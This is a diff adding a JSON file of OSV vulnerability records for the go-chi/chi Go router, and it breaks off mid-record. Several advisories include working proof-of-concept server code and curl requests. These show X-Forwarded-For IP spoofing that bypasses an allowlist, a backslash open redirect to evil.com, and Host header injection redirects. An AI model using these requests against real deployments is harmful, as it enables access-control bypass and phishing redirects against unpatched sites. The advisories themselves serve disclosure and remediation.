@@ -1,0 +1,1426 @@
+{
+ "source": "https://api.osv.dev",
+ "recorded": "2026-10-28",
+ "queries": {
+  "Go:github.com/go-chi/chi/v5": [
+   {
+    "id": "GHSA-j6qf-3m9c-vwj3",
+    "summary": "chi: Client IP spoofing in ClientIPFromXFF via X-Forwarded-For",
+    "details": "### Summary\n\n`ClientIPFromXFF` skips any `X-Forwarded-For` entry in a configured trusted CIDR but never verifies that the direct TCP peer in `http.Request.RemoteAddr` belongs to that CIDR. A client that can reach the Go server directly can therefore append a trusted-looking proxy address and choose the client IP returned by `middleware.GetClientIP`.\n\nThe attack is remote and requires one unauthenticated HTTP request with no user interaction (AV:N/AC:L/PR:N/UI:N). It changes security decisions and exposes one protected handler within the same application (S:U/C:L/I:L); no availability loss was observed (A:N).\n\n**Preconditions:** The application uses `ClientIPFromXFF` and makes the origin server reachable by an anonymous client outside the configured trusted-proxy CIDRs. No victim interaction is required.\n\n1. Send `GET /admin` directly to the origin with no `X-Forwarded-For` header.\n2. Observe a `403 Forbidden` response and an empty derived client IP.\n3. Repeat the request with `X-Forwarded-For: 10.0.0.7, 198.51.100.42`.\n4. Observe `200 OK` and `client-ip=\"10.0.0.7\"`. Expected: the untrusted direct peer prevents the forwarding chain from being accepted.\n\n### Details\n\nThe vulnerable code is `ClientIPFromXFF` in `middleware/client_ip.go`, lines 93-116 at the tested revision. It calls `walkXFF` with only the attacker-controlled header, skips every entry that matches a trusted prefix, and stores the first remaining address:\n\n```go\nwalkXFF(r.Header[xForwardedForHeader], func(v string) bool {\n\tip, ok := parseHeaderAddr(v)\n\tif !ok {\n\t\treturn true\n\t}\n\tif inAnyPrefix(ip, prefixes) {\n\t\treturn false\n\t}\n\tfound = ip\n\treturn true\n})\n```\n\nThe function does not parse `r.RemoteAddr` before this walk. Consequently, the configured CIDRs identify trusted strings inside `X-Forwarded-For`, but do not establish that the immediate sender is one of those trusted proxies.\n\n### Proof of concept\n\nUsing Go 1.24 or later, create and run this minimal application against the tested revision:\n\n```sh\nmkdir chi-clientip-poc\ncd chi-clientip-poc\ngo mod init clientip-poc\ngo get github.com/go-chi/chi/v5@167e1e3bd039d060696b99c8da4e876ae04f42c1\ncat > main.go <<'EOF'\npackage main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n\n\t\"github.com/go-chi/chi/v5\"\n\t\"github.com/go-chi/chi/v5/middleware\"\n)\n\nconst allowedIP = \"10.0.0.7\"\n\nfunc main() {\n\tr := chi.NewRouter()\n\tr.Use(middleware.ClientIPFromXFF(\"198.51.100.0/24\"))\n\tr.Get(\"/admin\", func(w http.ResponseWriter, r *http.Request) {\n\t\tclientIP := middleware.GetClientIP(r.Context())\n\t\tif clientIP != allowedIP {\n\t\t\thttp.Error(w, fmt.Sprintf(\"denied: tcp-peer=%q client-ip=%q\", r.RemoteAddr, clientIP), http.StatusForbidden)\n\t\t\treturn\n\t\t}\n\t\tfmt.Fprintf(w, \"allowed: tcp-peer=%q client-ip=%q\\n\", r.RemoteAddr, clientIP)\n\t})\n\n\tlog.Print(\"listening on http://127.0.0.1:3001\")\n\tlog.Fatal(http.ListenAndServe(\"127.0.0.1:3001\", r))\n}\nEOF\ngo run .\n```\n\nThe no-header control was rejected:\n\n```console\n$ curl --http1.1 -i http://127.0.0.1:3001/admin\nHTTP/1.1 403 Forbidden\nContent-Type: text/plain; charset=utf-8\nX-Content-Type-Options: nosniff\nDate: Tue, 06 Oct 2026 15:46:27 GMT\nContent-Length: 48\n\ndenied: tcp-peer=\"127.0.0.1:54416\" client-ip=\"\"\n```\n\nAdding the forged chain authorized the same direct client:\n\n```console\n$ curl --http1.1 -i -H 'X-Forwarded-For: 10.0.0.7, 198.51.100.42' http://127.0.0.1:3001/admin\nHTTP/1.1 200 OK\nDate: Tue, 06 Oct 2026 15:46:33 GMT\nContent-Length: 57\nContent-Type: text/plain; charset=utf-8\n\nallowed: tcp-peer=\"127.0.0.1:54417\" client-ip=\"10.0.0.7\"\n```\n\n### Impact\n\nI made an anonymous direct connection from `127.0.0.1`, supplied a header that ended in a different trusted-proxy CIDR, and caused the application to treat my client IP as the allowlisted `10.0.0.7`. This changed the authorization decision from `403 Forbidden` to `200 OK` for the protected handler.",
+    "aliases": [
+     "CVE-2026-114437"
+    ],
+    "modified": "2026-10-23T21:15:03.935320289Z",
+    "published": "2026-10-23T20:56:46Z",
+    "database_specific": {
+     "severity": "MODERATE",
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-10-23T20:56:46Z",
+     "nvd_published_at": null,
+     "cwe_ids": [
+      "CWE-345"
+     ]
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/go-chi/chi/security/advisories/GHSA-j6qf-3m9c-vwj3"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-114437"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/go-chi/chi/pull/1214"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/go-chi/chi/commit/7f9b7448f51d28804fac98c0a17bc2a7cec1079f"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/go-chi/chi"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/go-chi/chi/releases/tag/v5.4.0"
+     },
+     {
+      "type": "WEB",
+      "url": "https://www.tenable.com/security/research/tra-2026-66"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "github.com/go-chi/chi/v5",
+       "ecosystem": "Go",
+       "purl": "pkg:golang/github.com/go-chi/chi/v5"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "5.4.0"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "last_known_affected_version_range": "<= 5.3.2",
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-j6qf-3m9c-vwj3/GHSA-j6qf-3m9c-vwj3.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-mqqf-5wvp-8fh8",
+    "summary": "chi has an open redirect vulnerability in the RedirectSlashes middleware",
+    "details": "### Summary\n\nThe `RedirectSlashes` function in middleware/strip.go does not perform correct input validation and can lead to an open redirect vulnerability.\n\n### Details\n\nThe `RedirectSlashes` function performs a `Trim` to all forward slash (`/`) characters, while prepending a single one at the begining of the path (Line 52).\n\nHowever, it does not trim backslashes (`\\`).\n\n```go\nFile: middleware/strip.go\n41: func RedirectSlashes(next http.Handler) http.Handler {\n...\n51: \t\t\t// Trim all leading and trailing slashes (e.g., \"//evil.com\", \"/some/path//\")\n52: \t\t\tpath = \"/\" + strings.Trim(path, \"/\")\n...\n62: }\n```\n\nAlso, from version 5.2.2 onwards the `RedirectSlashes` function does not take into consideration the `Host` Header in the redirect response returned. This was done in order to combat another [[vulnerability](https://github.com/go-chi/chi/security/advisories/GHSA-vrw8-fxc6-2r93)](https://github.com/go-chi/chi/security/advisories/GHSA-vrw8-fxc6-2r93).\n\nThe above make it possible for a response in the following form:\n\n```\nHTTP/1.1 301 Moved Permanently\nLocation: /\\evil.com\n```\n\nThe `/\\evil.com` will be transformed by most browsers (Chrome, Firefox, etc. not Safari) into `//evil.com` which is a protocol relative URL and will result in a redirect to `evil.com`, essentially making it an open redirect vulnerability.\n\n### PoC\n\nA minimal working example can be seen below.\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\n\t\"github.com/go-chi/chi/v5\"\n\t\"github.com/go-chi/chi/v5/middleware\"\n)\n\n\n\nfunc main() {\n\tr := chi.NewRouter()\n\n\tr.Use(middleware.RedirectSlashes)\n\n\tr.Get(\"/*\", func(w http.ResponseWriter, r *http.Request) {\n\t\tw.WriteHeader(http.StatusOK)\n\t})\n\n\tfmt.Println(\"Server starting on port 8081...\")\n\tif err := http.ListenAndServe(\":8081\", r); err != nil {\n\t\tfmt.Printf(\"Error starting server: %v\\n\", err)\n\t}\n}\n\n```\n\nAnd when we request the path `/\\evil.com` (needs a second backslash or URL encoding in the terminal), the HTTP Redirect Location is just `/\\evil.com` without any domain/Host information.\n\n```bash\n$ curl -I  localhost:8081/\\\\evil.com/\nHTTP/1.1 301 Moved Permanently\nContent-Type: text/html; charset=utf-8\nLocation: /\\evil.com\n```\n\n```bash\n$ curl -I  localhost:8081/%5Cevil.com/\nHTTP/1.1 301 Moved Permanently\nContent-Type: text/html; charset=utf-8\nLocation: /\\evil.com\n```\n\nThis opened in a browser (Chrome, Firefox) will result in a transformation to `//evil.com` which in turn will result in a redirect to `evil.com`.\n<img width=\"200\" alt=\"image-20250829115619807\" src=\"https://github.com/user-attachments/assets/44aedad1-64b6-4660-8b26-fad9b4eca036\" />\n\n\n<img width=\"200\" alt=\"image-20250829115632067\" src=\"https://github.com/user-attachments/assets/b976d47d-1975-469c-abd3-deb907a68db2\" />\n\n\n### Impact\n\nThis essentially consists of an open redirect vulnerability, provided that victim users use the most popular browsers (Chrome, Firefox, etc. It does not work in e.g. Safari).\n\nThe attacker can construct a malicious URL on a domain of a legitimate website and send it to the victim user. The victim users thinking that they will click on a legitimate website's URL, they will unknowingly be reidrected to an attacker controlled website.\n\nThis can lead to credential theft if the victim gets redirected to a phishing website, to malware that is hosted on the attacker controlled website etc. Also, it has a greate reputation / business impact for the affected legitimate website.\n\nIn order to exploit this vulnerability the attacker does not need to be authenticated or have ay other priviledge / knowledge regarding the affected application.\n\nCVSS Score: [4.7 (Medium)](https://www.first.org/cvss/calculator/3-0#CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N)",
+    "aliases": [
+     "CVE-2025-69725",
+     "GO-2026-4316"
+    ],
+    "modified": "2026-09-10T03:50:33.318575071Z",
+    "published": "2026-01-14T21:18:06Z",
+    "database_specific": {
+     "severity": "MODERATE",
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-01-14T21:18:06Z",
+     "nvd_published_at": null,
+     "cwe_ids": [
+      "CWE-601"
+     ]
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/go-chi/chi/security/advisories/GHSA-mqqf-5wvp-8fh8"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-69725"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/go-chi/chi/issues/1037"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/go-chi/chi/commit/6eb35881c0e438ffb663ddbad3a61babaa5e5d8a"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/go-chi/chi"
+     },
+     {
+      "type": "WEB",
+      "url": "http://go-chichi.com"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "github.com/go-chi/chi/v5",
+       "ecosystem": "Go",
+       "purl": "pkg:golang/github.com/go-chi/chi/v5"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "5.2.2"
+         },
+         {
+          "fixed": "5.2.4"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-mqqf-5wvp-8fh8/GHSA-mqqf-5wvp-8fh8.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-vrw8-fxc6-2r93",
+    "summary": "chi Allows Host Header Injection which Leads to Open Redirect in RedirectSlashes",
+    "details": "### Summary\nThe RedirectSlashes function in middleware/strip.go is vulnerable to host header injection which leads to open redirect.\n\nWe consider this a **lower-severity** open redirect, as it can't be exploited from browsers or email clients (requires manipulation of a Host header).\n\n### Details\nThe RedirectSlashes method uses the Host header to construct the redirectURL at this line https://github.com/go-chi/chi/blob/master/middleware/strip.go#L55\n\nThe Host header can be manipulated by a user to be any arbitrary host. This leads to open redirect when using the RedirectSlashes middleware\n\n### PoC\nCreate a simple server which uses the RedirectSlashes middleware\n```\npackage main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\n\t\"github.com/go-chi/chi/v5\"\n\t\"github.com/go-chi/chi/v5/middleware\" // Import the middleware package\n)\n\nfunc main() {\n\t// Create a new Chi router\n\tr := chi.NewRouter()\n\n\t// Use the built-in RedirectSlashes middleware\n\tr.Use(middleware.RedirectSlashes) // Use middleware.RedirectSlashes\n\n\t// Define a route handler\n\tr.Get(\"/\", func(w http.ResponseWriter, r *http.Request) {\n\t\t// A simple response\n\t\tw.Write([]byte(\"Hello, World!\"))\n\t})\n\n\t// Start the server\n\tfmt.Println(\"Starting server on :8080\")\n\thttp.ListenAndServe(\":8080\", r)\n}\n```\nRun the server `go run main.go`\n\nOnce the server is running, send a request that will trigger the RedirectSlashes function with an arbitrary Host header\n`curl -iL -H \"Host: example.com\" http://localhost:8080/test/`\n\nObserve that the request will be redirected to example.com\n\n```\ncurl -L -H \"Host: example.com\" http://localhost:8080/test/\n\n<!doctype html>\n<html>\n<head>\n    <title>Example Domain</title>\n\n    <meta charset=\"utf-8\" />\n    <meta http-equiv=\"Content-type\" content=\"text/html; charset=utf-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <style type=\"text/css\">\n    body {\n        background-color: #f0f0f2;\n        margin: 0;\n        padding: 0;\n        font-family: -apple-system, system-ui, BlinkMacSystemFont, \"Segoe UI\", \"Open Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif;\n... snipped ...\n```\nWithout the host header, the response is returned from the test server\n```\ncurl -L http://localhost:8080/test/\n\n404 page not found\n```\n\n### Impact\nAn open redirect vulnerability allows attackers to trick users into visiting malicious sites. This can lead to phishing attacks, credential theft, and malware distribution, as users trust the application\u2019s domain while being redirected to harmful sites.\n\n### Potential mitigation\nIt seems that the purpose of the RedirectSlashes function is to redirect within the same application. In that case r.RequestURI can be used instead of r.Host by default. If there is a use case to redirect to a different host, a flag can be added to use the Host header instead. As this flag will be controlled by the developer they will make the decision of allowing redirects to arbitrary hosts  based on their judgement.",
+    "aliases": [
+     "CVE-2025-71405",
+     "GO-2025-3770"
+    ],
+    "modified": "2026-10-02T23:30:06.689984674Z",
+    "published": "2025-06-20T16:37:47Z",
+    "database_specific": {
+     "github_reviewed_at": "2025-06-20T16:37:47Z",
+     "nvd_published_at": null,
+     "cwe_ids": [
+      "CWE-601"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/go-chi/chi/security/advisories/GHSA-vrw8-fxc6-2r93"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-71405"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/go-chi/chi/commit/1be7ad938cc9c5b39a9dea01a5c518848928ab65"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/go-chi/chi"
+     },
+     {
+      "type": "WEB",
+      "url": "https://www.vulncheck.com/advisories/go-chi-chi-before-open-redirect-via-redirectslashes"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "github.com/go-chi/chi/v5",
+       "ecosystem": "Go",
+       "purl": "pkg:golang/github.com/go-chi/chi/v5"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "5.2.2"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "last_known_affected_version_range": "<= 5.2.1",
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-vrw8-fxc6-2r93/GHSA-vrw8-fxc6-2r93.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N"
+     }
+    ]
+   },
+   {
+    "id": "GO-2025-3770",
+    "summary": "Host header injection which leads to open redirect in RedirectSlashes in github.com/go-chi/chi",
+    "details": "Host header injection which leads to open redirect in RedirectSlashes in github.com/go-chi/chi",
+    "aliases": [
+     "CVE-2025-71405",
+     "GHSA-vrw8-fxc6-2r93"
+    ],
+    "modified": "2026-08-15T05:19:10.246790670Z",
+    "published": "2025-07-21T15:05:07Z",
+    "related": [
+     "CGA-pfh9-hhcg-hhh3"
+    ],
+    "database_specific": {
+     "url": "https://pkg.go.dev/vuln/GO-2025-3770",
+     "review_status": "REVIEWED"
+    },
+    "references": [
+     {
+      "type": "ADVISORY",
+      "url": "https://github.com/go-chi/chi/security/advisories/GHSA-vrw8-fxc6-2r93"
+     },
+     {
+      "type": "FIX",
+      "url": "https://github.com/go-chi/chi/commit/1be7ad938cc9c5b39a9dea01a5c518848928ab65"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "github.com/go-chi/chi/v5",
+       "ecosystem": "Go",
+       "purl": "pkg:golang/github.com/go-chi/chi/v5"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "5.2.1"
+         },
+         {
+          "fixed": "5.2.2"
+         }
+        ]
+       }
+      ],
+      "ecosystem_specific": {},
+      "database_specific": {
+       "source": "https://vuln.go.dev/ID/GO-2025-3770.json"
+      }
+     }
+    ],
+    "schema_version": "1.7.3"
+   },
+   {
+    "id": "GO-2026-4316",
+    "summary": "Open redirect vulnerability in the RedirectSlashes middleware in github.com/go-chi/chi",
+    "details": "Open redirect vulnerability in the RedirectSlashes middleware in github.com/go-chi/chi",
+    "aliases": [
+     "CVE-2025-69725",
+     "GHSA-mqqf-5wvp-8fh8"
+    ],
+    "modified": "2026-08-07T08:11:52.690351852Z",
+    "published": "2026-01-23T02:28:11Z",
+    "related": [
+     "CGA-76m3-5fxv-q2q2"
+    ],
+    "database_specific": {
+     "review_status": "REVIEWED",
+     "url": "https://pkg.go.dev/vuln/GO-2026-4316"
+    },
+    "references": [
+     {
+      "type": "ADVISORY",
+      "url": "https://github.com/go-chi/chi/security/advisories/GHSA-mqqf-5wvp-8fh8"
+     },
+     {
+      "type": "FIX",
+      "url": "https://github.com/go-chi/chi/commit/6eb35881c0e438ffb663ddbad3a61babaa5e5d8a"
+     },
+     {
+      "type": "REPORT",
+      "url": "https://github.com/go-chi/chi/issues/1037"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "github.com/go-chi/chi",
+       "ecosystem": "Go",
+       "purl": "pkg:golang/github.com/go-chi/chi"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         }
+        ]
+       }
+      ],
+      "ecosystem_specific": {},
+      "database_specific": {
+       "source": "https://vuln.go.dev/ID/GO-2026-4316.json"
+      }
+     },
+     {
+      "package": {
+       "name": "github.com/go-chi/chi/v2",
+       "ecosystem": "Go",
+       "purl": "pkg:golang/github.com/go-chi/chi/v2"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         }
+        ]
+       }
+      ],
+      "ecosystem_specific": {},
+      "database_specific": {
+       "source": "https://vuln.go.dev/ID/GO-2026-4316.json"
+      }
+     },
+     {
+      "package": {
+       "name": "github.com/go-chi/chi/v3",
+       "ecosystem": "Go",
+       "purl": "pkg:golang/github.com/go-chi/chi/v3"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         }
+        ]
+       }
+      ],
+      "ecosystem_specific": {},
+      "database_specific": {
+       "source": "https://vuln.go.dev/ID/GO-2026-4316.json"
+      }
+     },
+     {
+      "package": {
+       "name": "github.com/go-chi/chi/v4",
+       "ecosystem": "Go",
+       "purl": "pkg:golang/github.com/go-chi/chi/v4"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         }
+        ]
+       }
+      ],
+      "ecosystem_specific": {},
+      "database_specific": {
+       "source": "https://vuln.go.dev/ID/GO-2026-4316.json"
+      }
+     },
+     {
+      "package": {
+       "name": "github.com/go-chi/chi/v5",
+       "ecosystem": "Go",
+       "purl": "pkg:golang/github.com/go-chi/chi/v5"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "5.2.2"
+         },
+         {
+          "fixed": "5.2.4"
+         }
+        ]
+       }
+      ],
+      "ecosystem_specific": {
+       "imports": [
+        {
+         "symbols": [
+          "RedirectSlashes"
+         ],
+         "path": "github.com/go-chi/chi/v5/middleware"
+        }
+       ]
+      },
+      "database_specific": {
+       "source": "https://vuln.go.dev/ID/GO-2026-4316.json"
+      }
+     }
+    ],
+    "schema_version": "1.7.5"
+   },
+   {
+    "id": "GO-2026-5774",
+    "summary": "Chi has an IP spoofing vulnerability in middleware.RealIP in github.com/go-chi/chi",
+    "details": "Chi has an IP spoofing vulnerability in middleware.RealIP in github.com/go-chi/chi",
+    "aliases": [
+     "CVE-2026-72815",
+     "GHSA-3fxj-6jh8-hvhx"
+    ],
+    "modified": "2026-08-15T05:18:57.642465257Z",
+    "published": "2026-07-24T18:35:55Z",
+    "related": [
+     "CGA-fv5x-24pc-x6fw"
+    ],
+    "database_specific": {
+     "url": "https://pkg.go.dev/vuln/GO-2026-5774",
+     "review_status": "REVIEWED"
+    },
+    "references": [
+     {
+      "type": "ADVISORY",
+      "url": "https://github.com/go-chi/chi/security/advisories/GHSA-3fxj-6jh8-hvhx"
+     },
+     {
+      "type": "FIX",
+      "url": "https://github.com/go-chi/chi/pull/967"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "github.com/go-chi/chi/v5",
+       "ecosystem": "Go",
+       "purl": "pkg:golang/github.com/go-chi/chi/v5"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "5.2.1"
+         },
+         {
+          "fixed": "5.3.0"
+         }
+        ]
+       }
+      ],
+      "ecosystem_specific": {
+       "imports": [
+        {
+         "path": "github.com/go-chi/chi/v5/middleware",
+         "symbols": [
+          "RealIP"
+         ]
+        }
+       ]
+      },
+      "database_specific": {
+       "source": "https://vuln.go.dev/ID/GO-2026-5774.json"
+      }
+     }
+    ],
+    "schema_version": "1.7.5"
+   },
+   {
+    "id": "GO-2026-5775",
+    "summary": "Chi Middleware vulnerable to IP spoofing via X-Forwarded-For header in github.com/go-chi/chi",
+    "details": "Chi Middleware vulnerable to IP spoofing via X-Forwarded-For header in github.com/go-chi/chi",
+    "aliases": [
+     "CVE-2026-72817",
+     "GHSA-9g5q-2w5x-hmxf"
+    ],
+    "modified": "2026-08-15T05:19:13.029024907Z",
+    "published": "2026-07-24T18:35:55Z",
+    "related": [
+     "CGA-vphg-6r8r-9x6m"
+    ],
+    "database_specific": {
+     "review_status": "REVIEWED",
+     "url": "https://pkg.go.dev/vuln/GO-2026-5775"
+    },
+    "references": [
+     {
+      "type": "ADVISORY",
+      "url": "https://github.com/go-chi/chi/security/advisories/GHSA-9g5q-2w5x-hmxf"
+     },
+     {
+      "type": "FIX",
+      "url": "https://github.com/go-chi/chi/pull/967"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/go-chi/chi/releases/tag/v5.3.0"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "github.com/go-chi/chi/v5",
+       "ecosystem": "Go",
+       "purl": "pkg:golang/github.com/go-chi/chi/v5"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "5.3.0"
+         }
+        ]
+       }
+      ],
+      "ecosystem_specific": {
+       "imports": [
+        {
+         "path": "github.com/go-chi/chi/v5/middleware",
+         "symbols": [
+          "RealIP"
+         ]
+        }
+       ]
+      },
+      "database_specific": {
+       "source": "https://vuln.go.dev/ID/GO-2026-5775.json"
+      }
+     }
+    ],
+    "schema_version": "1.7.5"
+   },
+   {
+    "id": "GO-2026-5777",
+    "summary": "Chi's RealIP Middleware allows IP spoofing via unvalidated X-Forwarded-For header in github.com/go-chi/chi",
+    "details": "Chi's RealIP Middleware allows IP spoofing via unvalidated X-Forwarded-For header in github.com/go-chi/chi",
+    "aliases": [
+     "CVE-2026-72816",
+     "GHSA-rjr7-jggh-pgcp"
+    ],
+    "modified": "2026-08-15T05:19:15.756579600Z",
+    "published": "2026-07-24T18:35:55Z",
+    "related": [
+     "CGA-3x7g-jp4q-h9fr"
+    ],
+    "database_specific": {
+     "url": "https://pkg.go.dev/vuln/GO-2026-5777",
+     "review_status": "REVIEWED"
+    },
+    "references": [
+     {
+      "type": "ADVISORY",
+      "url": "https://github.com/go-chi/chi/security/advisories/GHSA-rjr7-jggh-pgcp"
+     },
+     {
+      "type": "FIX",
+      "url": "https://github.com/go-chi/chi/pull/967"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/go-chi/chi/releases/tag/v5.3.0"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "github.com/go-chi/chi/v5",
+       "ecosystem": "Go",
+       "purl": "pkg:golang/github.com/go-chi/chi/v5"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "5.3.0"
+         }
+        ]
+       }
+      ],
+      "ecosystem_specific": {
+       "imports": [
+        {
+         "path": "github.com/go-chi/chi/v5/middleware",
+         "symbols": [
+          "RealIP"
+         ]
+        }
+       ]
+      },
+      "database_specific": {
+       "source": "https://vuln.go.dev/ID/GO-2026-5777.json"
+      }
+     }
+    ],
+    "schema_version": "1.7.5"
+   }
+  ]
+ },
+ "entries": {
+  "CVE-2026-72815": {
+   "id": "CVE-2026-72815",
+   "summary": "go-chi chi v5.2.1 IP Spoofing via X-Forwarded-For Header",
+   "details": "go-chi chi versions >= 5.2.1 and before 5.3.0 contain an IP spoofing vulnerability in the RealIP middleware, which blindly trusts the first (leftmost) value of the X-Forwarded-For HTTP header. A remote attacker can bypass IP-based access control lists and rate-limiting mechanisms, and forge log entries, by supplying a spoofed IP address in the X-Forwarded-For header. The issue is fixed in version 5.3.0.",
+   "aliases": [
+    "GHSA-3fxj-6jh8-hvhx",
+    "GO-2026-5774"
+   ],
+   "modified": "2026-10-28T17:27:15.771641401Z",
+   "published": "2026-08-14T11:35:27.496Z",
+   "related": [
+    "openSUSE-SU-2026:11607-1",
+    "openSUSE-SU-2026:11810-1",
+    "openSUSE-SU-2026:12297-1",
+    "openSUSE-SU-2026:21645-1",
+    "openSUSE-SU-2026:21653-1",
+    "openSUSE-SU-2026:21670-1",
+    "openSUSE-SU-2026:21793-1",
+    "openSUSE-SU-2026:21918-1"
+   ],
+   "database_specific": {
+    "cna_assigner": "VulnCheck",
+    "cwe_ids": [
+     "CWE-290"
+    ],
+    "osv_generated_from": "https://github.com/CVEProject/cvelistV5/tree/main/cves/2026/72xxx/CVE-2026-72815.json"
+   },
+   "references": [
+    {
+     "type": "ADVISORY",
+     "url": "https://github.com/CVEProject/cvelistV5/tree/main/cves/2026/72xxx/CVE-2026-72815.json"
+    },
+    {
+     "type": "ADVISORY",
+     "url": "https://github.com/go-chi/chi/security/advisories/GHSA-3fxj-6jh8-hvhx"
+    },
+    {
+     "type": "ADVISORY",
+     "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-72815"
+    },
+    {
+     "type": "ADVISORY",
+     "url": "https://www.vulncheck.com/advisories/go-chi-chi-ip-spoofing-via-x-forwarded-for-header"
+    }
+   ],
+   "affected": [
+    {
+     "ranges": [
+      {
+       "type": "GIT",
+       "repo": "https://github.com/go-chi/chi",
+       "events": [
+        {
+         "introduced": "71307f9b7e4e9527638bc951c42b782cd1560331"
+        },
+        {
+         "fixed": "3b171578ca44dfd75ca3c5cbddc7b44c600a7b49"
+        }
+       ],
+       "database_specific": {
+        "extracted_events": [
+         {
+          "source": "AFFECTED_FIELD",
+          "strategy": "StandardRange",
+          "range": [
+           {
+            "introduced": "5.2.1"
+           },
+           {
+            "fixed": "5.3.0"
+           }
+          ]
+         }
+        ]
+       }
+      }
+     ],
+     "versions": [
+      "v5.2.5",
+      "v5.2.4",
+      "v5.2.3",
+      "v5.2.2",
+      "v5.2.1"
+     ],
+     "database_specific": {
+      "source": "https://storage.googleapis.com/cve-osv-conversion/osv-output/CVE-2026-72815.json"
+     }
+    }
+   ],
+   "schema_version": "1.9.2",
+   "severity": [
+    {
+     "type": "CVSS_V4",
+     "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N"
+    }
+   ]
+  },
+  "GHSA-3fxj-6jh8-hvhx": {
+   "id": "GHSA-3fxj-6jh8-hvhx",
+   "summary": "chi Has an IP Spoofing Vulnerability in `middleware.RealIP`",
